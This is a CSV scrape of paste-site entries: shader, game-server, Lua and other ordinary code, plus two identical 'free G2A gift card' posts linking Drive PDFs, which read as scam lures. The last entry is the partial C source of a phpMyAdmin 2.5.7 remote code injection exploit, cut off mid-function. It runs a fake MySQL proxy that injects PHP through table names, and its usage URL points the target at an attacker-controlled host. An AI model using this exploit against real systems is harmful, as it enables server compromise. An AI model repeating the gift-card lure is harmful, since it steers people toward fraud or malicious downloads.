id,title,username,language,date,content
3CvWmvYP,ü§ë G2A.com Free Gift Card Guide May 2024 FIX üéÅ,ssss50w,GetText,Friday 24th of May 2024 06:54:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
24 May 2024"
8krtEZLD,aCis Double Click Augment,Axelut,Java,Friday 24th of May 2024 06:46:09 AM CDT,"package net.sf.l2j.mods.itemhandlers;

import net.sf.l2j.gameserver.data.xml.AugmentationData;
import net.sf.l2j.gameserver.enums.Paperdoll;
import net.sf.l2j.gameserver.enums.SayType;
import net.sf.l2j.gameserver.handler.IItemHandler;
import net.sf.l2j.gameserver.model.Augmentation;
import net.sf.l2j.gameserver.model.actor.Playable;
import net.sf.l2j.gameserver.model.actor.Player;
import net.sf.l2j.gameserver.model.item.instance.ItemInstance;
import net.sf.l2j.gameserver.network.serverpackets.CreatureSay;
import net.sf.l2j.gameserver.network.serverpackets.ExShowScreenMessage;
import net.sf.l2j.gameserver.network.serverpackets.InventoryUpdate;
import net.sf.l2j.gameserver.network.serverpackets.SocialAction;

/**
 * @author RKolibri
 */
public class FastAugmentation implements IItemHandler {
    @Override
    public void useItem(Playable playable, ItemInstance item, boolean forceUse) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        Augmentation topLs = AugmentationData.getInstance().generateRandomAugmentation(76, 3);
        Augmentation highLs = AugmentationData.getInstance().generateRandomAugmentation(76, 2);
        Augmentation midLs = AugmentationData.getInstance().generateRandomAugmentation(76, 1);
        Augmentation noGradeLs = AugmentationData.getInstance().generateRandomAugmentation(76, 0);
        InventoryUpdate iu = new InventoryUpdate();
        int ls = item.getItemId();
        if (weapon == null) {
            player.sendMessage(""You have to equip a weapon first."");
            return;
        }
        if (weapon.getItem().getCrystalType().getId() <= 3) {
            player.sendMessage(""Fast Augmentation available only for A and S grade  Weapons!"");
            return;
        }
        if (weapon.isHeroItem()) {
            player.sendMessage(""Hero weapons can't be augmented!"");
            return;
        }
        if (weapon.isAugmented()) {
            removeAug(playable);
        } else {
            player.destroyItem(""Consume"", item.getObjectId(), 1, null, false);
            Augmentation augmentation;
            if (ls == 8762) {
                augmentation = topLs;
            } else if (ls == 8752) {
                augmentation = highLs;
            } else if (ls == 8742) {
                augmentation = midLs;
            } else if (ls == 8732) {
                augmentation = noGradeLs;
            } else {
                return;
            }
            weapon.setAugmentation(augmentation);
            iu.addModifiedItem(weapon);
            player.sendPacket(iu);
            player.broadcastUserInfo();
            if (weapon.getAugmentation().getSkill() == null) {
                player.sendMessage(""No luck try again!"");
            } else {
                checkAugmentResult(playable);
            }
        }
    }

    public static boolean removeAug(Playable playable) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        InventoryUpdate iu = new InventoryUpdate();
        weapon.getAugmentation().removeBonus(player);
        weapon.removeAugmentation(true);
        iu.addModifiedItem(weapon);
        player.sendPacket(iu);
        player.broadcastUserInfo();
        return true;
    }

    private static void checkAugmentResult(Playable playable) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        String name = weapon.getAugmentation().getSkill().getName();
        boolean isChance = weapon.getAugmentation().getSkill().isChance();
        boolean isActive = weapon.getAugmentation().getSkill().isActive();
        boolean isPassive = weapon.getAugmentation().getSkill().isPassive() && !isChance;
        InventoryUpdate iu = new InventoryUpdate();

        String type;
        if (isChance) {
            type = ""CHANCE"";
        } else if (isActive) {
            type = ""ACTIVE"";
        } else if (isPassive) {
            type = ""PASSIVE"";
        } else {
            return;
        }

        player.sendPacket(new CreatureSay(0, SayType.HERO_VOICE, ""["" + type + ""]"", ""You got "" + name));
        sendMessage(player, type + "" : You got "" + name);
        player.broadcastPacket(new SocialAction(player, 3));
        player.disarmWeapon(true);
        iu.addModifiedItem(weapon);
        player.sendPacket(iu);
        player.broadcastUserInfo();
    }

    public static void sendMessage(final Player player, final String message) {
        player.sendPacket(new ExShowScreenMessage(message, 3000, ExShowScreenMessage.SMPOS.TOP_CENTER, true));
        player.sendMessage(message);
    }

}












//////////////////////////////////////////////
 you also have to register it on your net.sf.l2j.gameserver.handler.ItemHandler.java

 

registerHandler(new FastAugmentation());

 

and on your items xml file

e.g gameserver/data/xml/items/8700-8799.xml

 

add this

add this 
<set name=""handler"" val=""FastAugmentation"" />

It should be like this 

<item id=""8762"" type=""EtcItem"" name=""Top-Grade Life Stone: level 76"">
		<set name=""material"" val=""LIQUID"" />
		<set name=""weight"" val=""2"" />
		<set name=""price"" val=""4800000"" />
		<set name=""handler"" val=""FastAugmentation"" />
		<set name=""is_stackable"" val=""true"" />
		<cond msgId=""113"">
			<player level=""76"" />
		</cond>
	</item>

"
TJ1YJvvv,CWBVH 8-wide traversal,Zgragselus,C,Friday 24th of May 2024 06:45:49 AM CDT,"///////////////////////////////////////////////////////////////////////////////////////////////////
//
// TraversalBvh8.hlsli
//
// Implements ray traversal through multi-level BVH-8 (CWBVH) acceleration structure.
// 
///////////////////////////////////////////////////////////////////////////////////////////////////

#ifndef __TRAVERSAL_BVH8__HLSLI__
#define __TRAVERSAL_BVH8__HLSLI__

#include ""../Raytracer.hlsli""

// Definition to compact funciton parameters into TraceRayCompute funciton (BVH-8 variant)
#define TRACE_RAY_PARAMS RWStructuredBuffer<GeometryNode> Geometries,\
                         RWStructuredBuffer<InstanceNode> Instances,\
                         RWStructuredBuffer<MemoryNode> ASTreeNodes,\
                         RWStructuredBuffer<BVH8Node> ASTreeData,\
                         RWStructuredBuffer<MemoryNode> ASIndexNodes,\
                         RWStructuredBuffer<uint> ASIndexData,\
                         RWStructuredBuffer<MemoryNode> WoopNodes,\
                         RWStructuredBuffer<float4> WoopData
    
// Definition to compact argument passing into TraceRayCompute function (BVH-8 variant)
#define TRACE_RAY_ARGS  Geometries,\
                        Instances,\
                        ASTreeNodes,\
                        ASTreeData,\
                        ASIndexNodes,\
                        ASIndexData,\
                        WoopNodes,\
                        WoopData

/// <summary>
/// Get octant of ray direction
/// </summary>
/// <param name=""rayDirection"">Ray direction</param>
/// <returns>Octant index encoded in 3 bits</returns>
uint GetOctant(float4 rayDirection)
{
    // Get inverse of ray octant, encoded in 3 bits
    return (rayDirection.x < 0.0f ? 0 : 0x04040404) |
		(rayDirection.y < 0.0f ? 0 : 0x02020202) |
		(rayDirection.z < 0.0f ? 0 : 0x01010101);
}

/// <summary>
/// Extract n-th byte from x
/// </summary>
/// <param name=""x"">Input value</param>
/// <param name=""n"">Byte index</param>
/// <returns>N-th byte value of input value</returns>
uint ExtractByte(uint x, uint n)
{
    return (x >> (n * 8)) & 0xFF;
}

/// <summary>
/// Intersect ray with BVH-8 in compact wide storage
/// </summary>
/// <param name=""origin"">Ray origin</param>
/// <param name=""direction"">Ray direction</param>
/// <param name=""octantInverse"">Inverse of ray octant</param>
/// <param name=""maxDistance"">Maximum distance to intersect</param>
/// <param name=""node0"">Holds origin point on local grid in first 12 bytes, exponents for axes in 3 bytes, mask in last byte (determining leaf/interior node)</param>
/// <param name=""node1"">Holds base child index (4-bytes), base triangle index (4-bytes), meta information (8-bytes)</param>
/// <param name=""node2"">Holds quantized AABBs - Min X (8-bytes), Max X (8-bytes)</param>
/// <param name=""node3"">Holds quantized AABBs - Min Y (8-bytes), Max Y (8-bytes)</param>
/// <param name=""node4"">Holds quantized AABBs - Min Z (8-bytes), Max Z (8-bytes)</param>
/// <returns>Hit mask</returns>
uint IntersectNode(float4 origin, float4 direction, uint octantInverse, float maxDistance, float4 node0, float4 node1, float4 node2, float4 node3, float4 node4)
{
    // Get base local point for children
    float3 p = node0.xyz;
    
    // Get exponents for axes
    uint emask = asuint(node0.w);
    uint eX = ExtractByte(emask, 0);
    uint eY = ExtractByte(emask, 1);
    uint eZ = ExtractByte(emask, 2);
    
    // Get adjusted direction by axes for intersection
    float3 adjDirection = float3(
        asfloat(eX << 23) / direction.x,
        asfloat(eY << 23) / direction.y,
        asfloat(eZ << 23) / direction.z
    );
    
    // Get adjusted origin for intersection
    float3 adjOrigin = (p - origin.xyz) / direction.xyz;
    
    // Resulting hitmask
    uint hitMask = 0;
    
    // Loop through data
    [unroll]
    for (int i = 0; i < 2; i++)
    {
        // Meta infromation
        uint meta4 = asuint(i == 0 ? node1.z : node1.w);
        
        // Extract bit indices and child bits
        uint isInner4 = (meta4 & (meta4 << 1)) & 0x10101010;
        uint innerMask4 = (((isInner4 << 3) >> 7) & 0x01010101) * 0xff;
        uint bitIndex4 = (meta4 ^ (octantInverse & innerMask4)) & 0x1F1F1F1F;
        uint childBits4 = (meta4 >> 5) & 0x07070707;
        
        // Extract quantized min/max of AABBs
        uint qLoX = asuint(i == 0 ? node2.x : node2.y);
        uint qHiX = asuint(i == 0 ? node2.z : node2.w);
        
        uint qLoY = asuint(i == 0 ? node3.x : node3.y);
        uint qHiY = asuint(i == 0 ? node3.z : node3.w);
        
        uint qLoZ = asuint(i == 0 ? node4.x : node4.y);
        uint qHiZ = asuint(i == 0 ? node4.z : node4.w);
        
        // Get per-axis min/max per direction of ray
        uint xMin = direction.x < 0.0f ? qHiX : qLoX;
        uint xMax = direction.x < 0.0f ? qLoX : qHiX;
        
        uint yMin = direction.y < 0.0f ? qHiY : qLoY;
        uint yMax = direction.y < 0.0f ? qLoY : qHiY;
        
        uint zMin = direction.z < 0.0f ? qHiZ : qLoZ;
        uint zMax = direction.z < 0.0f ? qLoZ : qHiZ;
        
        // Loop through all 4 AABBs in current iteration (2-iters = 8 AABBs in total)
        [unroll]
        for (int j = 0; j < 4; j++)
        {
            // Get quantized min value per axis for given AABB
            float3 tmin3 = float3(
                float(ExtractByte(xMin, j)),
                float(ExtractByte(yMin, j)),
                float(ExtractByte(zMin, j)));

            // Get quantized max value per axis for given AABB
            float3 tmax3 = float3(
                float(ExtractByte(xMax, j)),
                float(ExtractByte(yMax, j)),
                float(ExtractByte(zMax, j)));
            
            // Use adjusted origin and direction to calculate min/max values
            tmin3 = mad(tmin3, adjDirection, adjOrigin);
            tmax3 = mad(tmax3, adjDirection, adjOrigin);
            
            // Calculate entry and exist distances along ray
            float tmin = max(max(tmin3.x, tmin3.y), max(tmin3.z, 0.1f));
            float tmax = min(min(tmax3.x, tmax3.y), min(tmax3.z, maxDistance));
            
            // Check whether intersection happens
            bool intersection = tmin <= tmax;
            
            // In case of intersection, store in hitmask
            [branch]
            if (intersection)
            {
                uint childBits = ExtractByte(childBits4, j);
                uint bitIndex = ExtractByte(bitIndex4, j);
                
                hitMask |= childBits << bitIndex;
            }
        }
    }

    return hitMask;
}

/// <summary>
/// Performs ray traversal through acceleration structure for single ray.
///
/// This function performs traversal through compressed wide Bounding Volume Hierarchy 
/// (BVH-8/CWBVH). Result of this funciton is represented by barycentric coordinates, primitive ID, 
/// geometry ID and distance along the ray to hitpoint.
/// </summary>
/// <param name=""r"">Ray to trace.</param>
/// <param name=""Geometries"">Buffer of GeometryNode - holds all definition for geometries in the scene</param>
/// <param name=""Instances"">Buffer of InstanceNode - holds all geometry instances definitions in the scene</param>
/// <param name=""ASTreeNodes"">Buffer of memory nodes - each representing single BVH node data definition/offsets</param>
/// <param name=""ASTreeData"">Buffer of BVH nodes - BVH node data</param>
/// <param name=""ASIndexNodes"">Buffer of memory nodes - each representing single BVH index data definition/offsets</param>
/// <param name=""ASIndexData"">Buffer of BVH indices - BVH index data</param>
/// <param name=""WoopNodes"">Buffer of memory nodes - each representing definition/offsets into data buffer holding woop triangle data</param>
/// <param name=""WoopData"">Buffer of woop triangle data - Woop triangle geometry data</param>
/// <returns>
/// 4-component vector, where:
///   1st component has packed U/V barycentric coordinates (see PackFloat2/UnpackFloat2)
///   2nd component distance along the ray to hit
///   3rd component primitive ID (unsigned int)
///   4th component geometry ID (unsigned int)
/// </returns>
float4 TraceRayCompute(Ray r, TRACE_RAY_PARAMS)
{
    float4 o = r.Origin;
    float4 d = r.Direction;
    float4 inv = r.Inverse;
    uint octInv4 = GetOctant(d);
    
    uint2 currentGroup = uint2(0, 0x80000000);
    uint2 triangleGroup = uint2(0, 0);
        
    uint2 stack[BVH_STACK_SIZE];
    uint stack_ptr = 0;
 
    int meshbvh_stack_ptr = -1;
    
    float tmin = 0.0f;
    float tmax = 10000.0f;
    float bU = 0.0f;
    float bV = 0.0f;
    uint prim_id = 0;
    uint geometryID = 0;
    bool hit = false;
	
    InstanceNode instance = Instances[0];
    
	// Traversal (use for for testing)
    [loop]
    for (int i = 0; i < 1024; i++)
    {
        // Test whether we're in interior node
        [branch]
        if (currentGroup.y & 0xff000000)
        {
            // Get next child index (consume bit)
            uint childIndexOffset = firstbithigh(currentGroup.y);
            
            uint slotIndex = (childIndexOffset - 24) ^ (octInv4 & 0xff);
            uint relativeIndex = countbits(currentGroup.y & ~(0xffffffff << slotIndex));
            uint childNodeIndex = currentGroup.x + relativeIndex;
            
            currentGroup.y &= ~(1 << childIndexOffset);
            
            if (currentGroup.y & 0xff000000)
            {
                stack[stack_ptr] = currentGroup;
                stack_ptr++;
            }
            
            // Perform intersection test against all 8 children
            uint hitMask = IntersectNode(o,
                d,
                octInv4,
                tmax,
                ASTreeData[childNodeIndex].Node0,
                ASTreeData[childNodeIndex].Node1,
                ASTreeData[childNodeIndex].Node2,
                ASTreeData[childNodeIndex].Node3,
                ASTreeData[childNodeIndex].Node4);
            
            // Update masks from hit results
            currentGroup.y = (hitMask & 0xff000000) | ((asuint(ASTreeData[childNodeIndex].Node0.w) >> 24) & 0xff);
            triangleGroup.y = (hitMask & 0x00ffffff);
            
            currentGroup.x = asuint(ASTreeData[childNodeIndex].Node1.x);
            triangleGroup.x = asuint(ASTreeData[childNodeIndex].Node1.y);
        }
        else
        {
            // Leaf node - current node group holds triangle group
            triangleGroup = currentGroup;
            currentGroup = uint2(0, 0);
        }
        
        // We are in leaf node
        if (triangleGroup.y != 0)
        {
            // We're searching top-level BVH (TLAS), enter bottom-level BVH (BLAS)
            if (meshbvh_stack_ptr == -1)
            {
                uint blas_offset = firstbithigh(triangleGroup.y);
                triangleGroup.y &= ~(1 << blas_offset);
                uint index_offset = ASIndexNodes[triangleGroup.x + blas_offset].Offset / 4;
                uint instance_index = ASIndexData[triangleGroup.x + blas_offset];
                instance = Instances[instance_index];
                                
                if (triangleGroup.y != 0)
                {
                    stack[stack_ptr] = triangleGroup;
                    stack_ptr++;
                }
                
                if (currentGroup.y & 0xff000000)
                {
                    stack[stack_ptr] = currentGroup;
                    stack_ptr++;
                }
                
                meshbvh_stack_ptr = stack_ptr;
            
                o = mul(r.Origin, instance.TransformInverse);
                d = mul(r.Direction, instance.TransformInverse);
                inv = rcp(d);
                octInv4 = GetOctant(d);
                
                currentGroup.x = ASTreeNodes[Geometries[instance.GeometryNode].BVHNode + 1].Offset / 80;
                currentGroup.y = 0x80000000;
            }
            // We're already in bottom-level BVH (BLAS)
            else
            {
                while (triangleGroup.y != 0)
                {
                    // Obtain next triangle from triangle group in BLAS node record
                    uint triangleIndex = firstbithigh(triangleGroup.y);
                    triangleGroup.y &= ~(1 << triangleIndex);
            
                    GeometryNode geom = Geometries[instance.GeometryNode];
                    MemoryNode wbo = WoopNodes[geom.WoopBufferNode];
                
                    uint index_offset = ASIndexNodes[triangleGroup.x + triangleIndex].Offset / 4;
             
					// Don't trash cache by reading index through it
                    uint tri_idx = ASIndexData[triangleGroup.x + triangleIndex] * 3;
                    
                    // Fetch data for Woop's triangle
                    float4 r = WoopData[wbo.Offset / 16 + tri_idx + 0];
                    float4 p = WoopData[wbo.Offset / 16 + tri_idx + 1];
                    float4 q = WoopData[wbo.Offset / 16 + tri_idx + 2];
                    
                    // Perform intersection
                    float o_z = r.w - o.x * r.x - o.y * r.y - o.z * r.z;
                    float i_z = 1.0f / (d.x * r.x + d.y * r.y + d.z * r.z);
                    float t = o_z * i_z;
                    
                    if (t > tmin && t < tmax)
                    {
                        float o_x = p.w + o.x * p.x + o.y * p.y + o.z * p.z;
                        float d_x = d.x * p.x + d.y * p.y + d.z * p.z;
                        float u = o_x + t * d_x;

                        if (u >= 0.0f && u <= 1.0f)
                        {
                            float o_y = q.w + o.x * q.x + o.y * q.y + o.z * q.z;
                            float d_y = d.x * q.x + d.y * q.y + d.z * q.z;
                            float v = o_y + t * d_y;
                            
                            if (v >= 0.0f && u + v <= 1.0f)
                            {
                                tmax = t;
                                bU = u;
                                bV = v;
                                hit = true;

                                geometryID = instance.GeometryNode;
                                prim_id = tri_idx;
                            }
                        }
                    }
                }
            }
        }
        
        // Pop stack if any item still in it, end traversal otherwise
        if ((currentGroup.y & 0xff000000) == 0)
        {
            // Entrypoint has been reached, terminate traversal
            if (stack_ptr == 0)
            {
                break;
            }
            
            // If we're in BLAS and we're on entrypoint, then reset the ray as the traversal will 
            // continue in TLAS
            if (stack_ptr == meshbvh_stack_ptr)
            {
                meshbvh_stack_ptr = -1;
                
                o = r.Origin;
                d = r.Direction;
                inv = r.Inverse;
                octInv4 = GetOctant(d);
            }
            
            // Pop from stack 
            stack_ptr--;
            currentGroup = stack[stack_ptr];
        }
    }
    
    return float4(PackFloat2(bU, bV), tmax, asfloat(prim_id), asfloat(geometryID));
}

#endif"
S1tj7JJE,Untitled,MingLLuo,OCaml,Friday 24th of May 2024 06:38:41 AM CDT,"(* f(0) = 0
     f(1) = 1
     f(2n) = n
     f(2n + 1) = f(n) + f(n + 1)
    --------------------------------

    a * f(2n) + b * f(2n + 1) = (a + b) * f(n) + b * f(n + 1)
    let F(x, y, z) = x * f(z) + y * f(z + 1)
    then
     F(a, b, 2n) = F(a+b, b, n)

    if z is even
     then F(x, y, z) = F(x + y, y, z / 2)
   else
     F(x, y, z) = x * f(z) + y * f(z + 1) = x * (f( (z - 1) / 2 ) + f( (z + 1) / 2)) + y * f( (z + 1) / 2)
       = x * f((z-1)/2) + (x + y) * f((z-1)/2 + 1)
       = F(x, x + y, (z - 1) / 2)
*)

let fusc (n : int) : int =
  let rec f x y z =
    if z == 0 then y
    else if z mod 2 = 0 then f (x + y) y (z / 2)
    else f x (x + y) ((z - 1) / 2)
  in
  f 1 0 n
"
Ng0dK7RL,growthhelper.lua,maxeebon,Lua,Friday 24th of May 2024 06:36:30 AM CDT,"--   –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —Ñ–∞—Ä–º–∞ –¥–µ—Ä–µ–≤–∞
--   –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∑–∞–ø—É—Å–∫–∞: —Ä–æ–±–æ—Ç —Å–º–æ—Ç—Ä–∏—Ç –≤ —Ç–æ—á–∫—É –≥–µ–¥ —Å–∞–∂–µ–Ω–µ—Ü, —Ä–æ–±–æ—Ç –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å —Å—É–Ω–¥—É–∫ —Å–≤–µ—Ä—Ö—É 
--   –¥–ª—è —Å–∫–ª–∞–¥—ã–≤–∞–Ω–∏—è –Ω–∞–¥–∞–º–∞–∂–µ–Ω–Ω–æ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞, —Å–Ω–∏–∑—É —Å—É–Ω–¥—É–∫ –≥–¥–µ –±—É–¥–µ—Ç –ø–æ—á–∏–Ω–µ–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç
--   –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ –∏–Ω–≤–µ–Ω—Ç–∞—Ä–µ —Ä–æ–±–æ—Ç–∞
--

local r = require(""robot"")
local component = require(""component"")
local sides = require(""sides"")
local inv = component.inventory_controller

local toolLabel = ""Hoe of Growth""   -- –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
local repairWaitingSleepTime = 4    -- –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ—á–∏–Ω–∫–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ (–≤ —Å–µ–∫.)
local durThreshold = 0.05			-- –ø—Ä–æ—Ü–µ–Ω—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ –¥–ª—è –Ω–∞—á–∞–ª–∞ –ø–æ—á–∏–Ω–∫–∏

local rInvSize = r.inventorySize()

function criticalError(str)
	print(""ERROR: ""..str)
	os.exit()
end

function findHoe()
	local a
	local found = false
	print(""finding hoe..."")
	
	if not found and not r.durability() then
		for i = 1,rInvSize do
			a = inv.getStackInInternalSlot(i)
			if a and a.label == toolLabel then
				found = true
				r.select(i)
				break
			end
		end
	end
	if not found then
		r.select(1)
		inv.equip()
		a = inv.getStackInInternalSlot(1)
		if a and a.label == toolLabel then
			found = true
		end
	end
	if not found then
		criticalError(""cannot find ""..toolLabel)
	end
	r.transferTo(1)
	r.select(1)
	inv.equip()
end

function init()
	findHoe()
	if not inv.getInventoryName(sides.bottom) then
		criticalError(""cannot find bottom inventory for repaired ""..toolLabel)
	end
	if not inv.getInventoryName(sides.top) then
		criticalError(""cannot find top inventory for damaged ""..toolLabel)
	end
end

function isDamaged()
	return r.durability() <= durThreshold
end

function placeForRepair()
	inv.equip()
	print(""placing ""..toolLabel.."" for repair"")
	if not inv.dropIntoSlot(sides.top,1) then
		criticalError(""cannot place ""..toolLabel.."" into top inventory"")
	end
end

function waitForRepair()
	local a = nil
	while not a do
		print(""waiting for ""..toolLabel.."" repairing"")
		os.sleep(repairWaitingSleepTime)
		a = inv.getStackInSlot(sides.bottom,1)
	end
	if a.label ~= toolLabel then
		criticalError(""wrong item in bottom chest"")
	end
	if not inv.suckFromSlot(sides.bottom,1) then
		criticalError(""cannot suck ""..toolLabel.."" from bottom inventory"")
	end
	inv.equip()
end

-- main

init()
while true do
	local flag,block = r.detect()
	if block == ""solid"" then
		print(""block is solid"")
		os.sleep(0.5)
	else
		print(""using ""..toolLabel)
		r.use()
		if isDamaged() then
			placeForRepair()
			os.sleep(1)
			waitForRepair()
		end
		os.sleep(0.01)
	end
end
"
vZPJyJN7,Black Hole Gun,robinmollen,Lua,Friday 24th of May 2024 06:27:59 AM CDT,"require(17585297630)(""YourNameHere"")"
WunBBPLN,Untitled,Armen_06,Dart,Friday 24th of May 2024 06:04:52 AM CDT,"            openInAppController.stream.listen((event) async {
              if (widget.index != selectedIndexNotifier.value) return;

              final urlToLaunch = (await controller.getUrl()).toString();

              ApplicationMessagesService.showSnackBarGenericError(
                  context, (await controller.getHtml()) as String);

              ApplicationMessagesService.showSnackBarGenericError(
                  context, urlToLaunch);
            });"
KMsy340Q,ü§ë G2A.com Free Gift Card Guide May 2024 FIX ü§ë,jusst2k4,GetText,Friday 24th of May 2024 06:01:54 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_679381.pdf

Working as of:
24 May 2024"
AkX2EJxH,data936,TestGuy1,JSON,Friday 24th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '86e7e58c1c0e686c77405698d49b2df03a93f61e42a64edd1ba4109020bfc16ee6a8284e119eacb33f2cd8e7aa4503bf910d92804d59d29641de29afa23ebfe85faa706ccca2bf4f8783aa4561bdbdd331c642ce871d5114739cff9fe7a1f1b57ebae1f9676d174bda22d3949dd644fe2148b434d880c03b0bf6c7396953fc61',
  otherdata: [
    '769ed35a5d95fc0cca9a7e45bb818876',
    '2fe89f4acdf97d1c92794081b70034bf',
    'ae08183e1dde1b9ef090b672b952a460',
    '17f6f29f645806265906a6234e1f4dd2',
    '2610ea1ed916724bd63023e1498a1bc8',
    '98e46b89aaba277b570be7ab8ff324b5',
    '6ccb18b19085b84c5c14ca47e415edaa',
    '8ed267bd936b4eaea8ddaf74b7e2f4be'
  ]
}"
AsJkQq4a,Untitled,35657,C++,Friday 24th of May 2024 05:48:45 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

template<typename container>
void print(container cont) {
    for (const auto& a : cont) {
        std::cout << a;
    }
    std::cout << std::endl;
}

struct student {
    std::string name;
    std::string surname;
    int course; // –æ—Ç 1 –¥–æ 5
    int rating; // –¥–æ 100
    double average_score; // –¥–æ 5
};


std::ostream& operator<<(std::ostream& output, const student& st) {
    output << st.name << "" "" << st.surname << "" "" << st.course << "" "" << st.rating << "" "" << st.average_score << std::endl;
    return output;
}

int main() {

    setlocale(LC_ALL, ""ru"");

    std::vector<student> students{ {""–ò–≤–∞–Ω"", ""–ò–≤–∞–Ω–æ–≤"", 1, 33, 3.7}, {""–í–ª–∞–¥–∏–º–∏—Ä"", ""–ú–∏—Ö–∞–π–ª–æ–≤"", 3, 39, 3.9}, {""–ì–µ–Ω–Ω–∞–¥–∏–π"", ""–ü–µ—Ç—Ä–æ–≤"", 2, 56, 4.2}, {""–û–ª—å–≥–∞"", ""–ì—Ä–∏–≥–æ—Ä—å–µ–≤–∞"", 5, 48, 4.0}, {""–ï–ª–µ–Ω–∞"", ""–ì—Ä–∏—à–∏–Ω–∞"", 4, 75, 4.9} };

    print(students);
    
    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.surname < right.surname; });

    print(students);

    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.rating > right.rating; });

    print(students);

    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.average_score > right.average_score; });

    print(students);
}
"
668SZvTm,phpMyAdmin 2.5.7 - Remote code Injection - CVE-2004-2631,FlyFar,C,Friday 24th of May 2024 05:41:58 AM CDT,"/*    
 * phpmy-explt.c  
 * written by Nasir Simbolon <nasir kecapi com>
 * eagle kecapi com
 * Jakarta, Indonesia
 * 
 * June, 10 2004 
 * 
 * A phpMyAdmin-2.5.7 exploite program.
 * This is a kind of   mysql server wrapper  acts like a proxy except that it will sends a fake table name,
 * when client query ""SHOW TABLES"",  by replacing the real table name with a string contains exploite codes.
 *
 * Compile : gcc phpmy-explt.c -o phpmy-explt
 *
 * run with
 * ./phpmy-explt
 *
 * and go to your target and put 
 *
 * http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers][4][host]=
 * attacker.host.com&cfg[Servers][4][port]=8889&cfg[Servers][4][auth_type]=config&cfg[Servers]
 * [4][user]=user&cfg[Servers][4][password]=pass&cfg[Servers][4][connect_type]=tcp&&cfg[Servers]
 * [4][only_db]=databasename
 *
 * fill host,port,user,pass and databasename correctly
 *
 */


#include<stdio.h>
#include<sys/socket.h>
#include<netdb.h>

#define BIND_PORT 8889
#define MYSQL_PORT 3306
#define HOSTNAME ""localhost""
#define DATABASE ""phpmy""


#define BUFFER_LEN 1024

/* This is php code we want to inject into phpMyAdmin 
   Do NOT use  single quote (') in the string, use double quote ("") instead
*/
char *phpcodes = ""exec(\""touch /tmp/your-phpmyadmin-is-vulnerable\"");"";


  /* This is examples codes I captured when mysql server
     reply to client's request of query ""SHOW TABLES"" query.
     It shows  database  name 'phpmy' and contain one tablename  'mytable'
     Our aim is to manipulate the data received from mysql server
     by replacing 'mytable' with our exploide codes.
     
     0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
     0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
     '_' ,'p' ,'h' ,'p' ,'m' ,'y' ,0x3 ,0x40,0x0 ,0x0 ,
     0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,0x1 ,0x0 ,0x0 ,0x3 ,
     -2  ,8  ,0x0 ,0x0 ,0x4 ,7   ,'m' ,'y' ,'t' ,'a' ,
     'b' ,'l' ,'e' ,0x1 ,0   ,0   ,0x5 ,-2
  */


int build_exploite_code(char* dbname,char* phpcodes,char** expcode)
{	
   char my1[21] = {0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
     	 	   0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
     		   '_'}; 
   /* part of dbname     ('p' ,'h' ,'p' ,'m' ,'y') */
   char my2[15] = {0x3 ,0x40,0x0 ,0x0 ,0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,
	           0x1 ,0x0 ,0x0 ,0x3 ,-2};  
   /* part of int phpcodes string length +1   (8) */ 
   char my3[3]  = {0x0 ,0x0 ,0x4};
   /* part of int phpcodes string length      (7) */ 
   /* part of tablename    ('m' ,'y' ,'t' ,'a' ,'b' ,'l' ,'e' ) */
   char my4[5]  = {0x1 ,0   ,0   ,0x5 ,-2};
	
   int len,i;

   len = 21 + strlen(dbname) + 15 + 1 + 3 + 1 +  strlen(phpcodes) + 5 + 5;
   *expcode = (char*) malloc(sizeof(char) * len); 
   
   i = 0;
   bcopy(&my1[0],*expcode + i,21);
   i += 21;
   bcopy(dbname, *expcode + i,strlen(dbname));
   i += strlen(dbname);
   bcopy(&my2[0],*expcode + i,15);
   i += 15;
   (*expcode)[i] = 5 + strlen(phpcodes) + 1;
   i ++;
   bcopy(&my3[0],*expcode + i,3);
   i += 3;  
